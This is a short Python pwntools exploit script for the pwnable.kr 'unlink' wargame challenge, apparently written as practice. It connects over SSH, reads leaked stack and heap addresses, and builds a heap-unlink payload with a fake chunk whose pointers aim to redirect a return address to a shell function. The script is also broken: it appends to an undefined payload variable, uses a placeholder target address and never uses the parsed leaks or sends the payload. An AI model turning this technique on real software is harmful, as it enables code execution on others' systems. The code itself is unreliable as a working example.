from pwn import *

sh = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
p = sh.process('./unlink')

# Receive stack leak as hex and parse it
p.recvuntil(b'stack address leak: ')
stack_leak = int(p.recv(10).decode('unicode_escape'), 16)

# Receive heap leak as hex and do the same
p.recvuntil(b'heap address leak: ')
heap_leak = int(p.recv(9).decode('unicode_escape'), 16)

stack_return = 0x7FFFFFFF # Stack address to overwrite
shell_function = 0x080484eb
prev_chunk_size = 24
chunk_size = 24

payload += b'A'*8
# Setup the fake chunk
payload += p32(prev_chunk_size)
payload += p32(chunk_size | 1) # Set previous chunk bit to 1
payload += p32(stack_return - 4) # Forward pointer (Remove the offset when indexing FD->bk)
payload += p32(shell_function) # Backwards pointer (shell function)
